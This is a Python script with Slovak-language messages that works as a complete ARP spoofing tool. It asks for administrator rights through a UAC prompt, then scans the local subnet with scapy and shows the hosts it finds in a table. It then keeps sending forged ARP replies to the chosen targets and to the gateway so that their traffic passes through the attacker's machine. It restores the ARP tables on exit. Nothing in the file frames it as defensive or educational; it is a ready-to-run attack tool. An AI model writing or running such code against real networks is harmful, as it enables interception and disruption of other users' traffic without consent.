import os
import sys
import ctypes

# Start by double clicking on this ".py" file to start
# Press Yes button hen ask for Admin privileges
# then it will start CMD window with script

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    script = sys.argv[0]
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return False
    except Exception as e:
        print("[✗] Nepodarilo sa spustiť ako správca:", str(e))
        input("Stlač ENTER na ukončenie...")
        return False

if not run_as_admin():
    sys.exit(0)




from scapy.all import *
import os
import time
import socket
import signal
from tabulate import tabulate
from termcolor import colored

interface = conf.iface  # Automaticky vyberie aktívne rozhranie
running = True

def is_admin():
    try:
        return os.getuid() == 0  # Unix
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows

def get_local_ip():
    return get_if_addr(interface)

def get_default_gateway():
    gw = conf.route.route("0.0.0.0")[2]
    return gw

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    ans = srp(packet, timeout=2, verbose=0, iface=interface)[0]
    for sent, received in ans:
        return received.hwsrc
    return None

def scan_network():
    print(colored("[*] Skenujem sieť pre zariadenia...", "yellow"))
    local_ip = get_local_ip()
    if not local_ip:
        print(colored("[✗] Nepodarilo sa získať lokálnu IP adresu", "red"))
        return []

    base_ip = ".".join(local_ip.split(".")[:-1]) + ".0/24"
    arp = ARP(pdst=base_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    ans = srp(packet, timeout=2, verbose=0, iface=interface)[0]

    devices = []
    for snd, rcv in ans:
        try:
            hostname = socket.gethostbyaddr(rcv.psrc)[0]
        except:
            hostname = "Neznáme"
        devices.append([rcv.psrc, rcv.hwsrc, hostname])
    return devices

def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, count=4, iface=interface, verbose=False)

def handle_ctrl_c(sig, frame):
    print(colored("\n[!] Detected CTRL C", "yellow"))
    print(colored("Exitting...", "red"))
    exit(0)

# Spustiť ako admin
if not is_admin():
    print(colored("[✗] Tento skript musí byť spustený ako správca!", "red"))
    input("Stlač ENTER na ukončenie...")
    exit(1)

signal.signal(signal.SIGINT, handle_ctrl_c)

# Hlavný tok
local_ip = get_local_ip()
gateway_ip = get_default_gateway()

if not gateway_ip:
    print(colored("[✗] Nepodarilo sa získať Default Gateway", "red"))
    exit(1)

print(colored("[✓] Default Gateway zistená: ", "green") + gateway_ip)

while True:
    devices = scan_network()
    devices.append(["RE-Scan devices", "", ""])  # Pridaj voľbu na opätovný sken
    headers = ["IP adresa", "MAC adresa", "Hostname"]
    print("\n" + colored(tabulate(devices, headers, tablefmt="fancy_grid"), "green"))

    targets_input = input(colored("\nZadaj cieľové IP adresy (oddelené čiarkou) alebo 'r' na RE-Scan: ", "yellow")).strip()

    if targets_input.lower() in ['r', 'rescan', 'scan']:
        continue  # reštartuj cyklus a znova skenuj

    target_ips = [ip.strip() for ip in targets_input.split(",") if ip.strip() != local_ip]

    if not target_ips:
        print(colored("[✗] Neplatný vstup – žiadne platné IP adresy", "red"))
        continue

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(colored("[✗] Nepodarilo sa získať MAC adresu gateway", "red"))
        exit(1)

    target_macs = {}
    for ip in target_ips:
        mac = get_mac(ip)
        if mac:
            target_macs[ip] = mac
        else:
            print(colored(f"[!] MAC pre {ip} sa nepodarilo získať", "red"))

    if not target_macs:
        print(colored("[✗] Žiadne platné ciele s MAC adresou", "red"))
        continue

    print(colored("\n[*] Spúšťam ARP spoofing (Ctrl+C pre ukončenie)", "cyan"))

    try:
        while True:
            for ip, mac in target_macs.items():
                spoof(ip, gateway_ip, mac)
                spoof(gateway_ip, ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print(colored("\n[!] Detected CTRL C", "yellow"))
        print(colored("[*] Obnovujem pôvodné ARP tabuľky...", "cyan"))
        for ip, mac in target_macs.items():
            restore(ip, gateway_ip, mac, gateway_mac)
            restore(gateway_ip, ip, gateway_mac, mac)
        print(colored("[✓] Obnovené. Exitting...", "red"))
        exit(0)
